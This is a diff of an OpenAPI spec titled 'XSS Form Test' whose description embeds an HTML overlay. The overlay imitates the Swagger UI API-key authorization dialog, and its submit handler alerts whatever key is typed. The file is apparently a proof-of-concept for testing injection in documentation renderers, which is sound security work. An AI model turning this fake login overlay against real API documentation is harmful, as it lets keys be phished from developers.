@@ -3,19 +3,19 @@ info:
   title: XSS Form Test
   description: |
     <div id="authModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; z-index: 9999; font-family: 'Droid Sans', sans-serif;">
-      <form id="fakeAuthForm" onsubmit="event.preventDefault(); alert('Captured input: ' + document.getElementById('apiKey').value);"
-            style="background-color: #f9f9f9; padding: 20px 24px; border-radius: 4px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: left; width: 500px; border: 1px solid #ddd;">
-        <h3 style="margin-top: 0; color: #777777; font-size: 24px; font-weight: normal;">Available authorizations</h3>
-        <h4 style="color: #547F00; font-size: 14.04px; font-weight: normal; margin: 0;">Api key authorization</h4>
-        <p style="color: #999999; font-size: 11.7px; margin: 8px 0 12px;">API Key Authenticationheader</p>
-        <label for="apiKey" style="font-size: 11.7px; color: #777777;">Key:</label>
-        <input type="text" id="apiKey" placeholder="api_key"><br>
-        <div style="margin-top: 16px;">
-          <button type="button" onclick="alert('Authorize clicked');" >Authorize</button><br>
-          <hr style="margin: 16px 0; border: 0; border-top: 1px solid #ddd;">
-          <button type="button" onclick="document.getElementById('authModal').remove();" >Cancel</button>
-        </div>
-      </form>
+        <form id="fakeAuthForm" onsubmit="event.preventDefault(); alert('Captured input: ' + document.getElementById('apiKey').value);"
+              style="background-color: #f9f9f9; padding: 20px 24px; border-radius: 4px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: left; width: 500px; border: 1px solid #ddd;">
+          <h3 style="margin-top: 0; color: #777777; font-size: 24px; font-weight: normal;">Available authorizations</h3>
+          <h4 style="color: #547F00; font-size: 14.04px; font-weight: normal; margin: 0;">Api key authorization</h4>
+          <p style="color: #999999; font-size: 11.7px; margin: 8px 0 12px;">API Key Authenticationheader</p>
+          <label for="apiKey" style="font-size: 11.7px; color: #777777;">Key:</label>
+          <input type="text" id="apiKey" placeholder="api_key"><br>
+          <div style="margin-top: 16px;">
+            <button type="button" onclick="alert('Authorize clicked');" >Authorize</button><br>
+            <hr style="margin: 16px 0; border: 0; border-top: 1px solid #ddd;">
+            <button type="button" onclick="document.getElementById('authModal').remove();" >Cancel</button>
+          </div>
+        </form>
     </div>
   version: "1.0.0"
 paths: {}
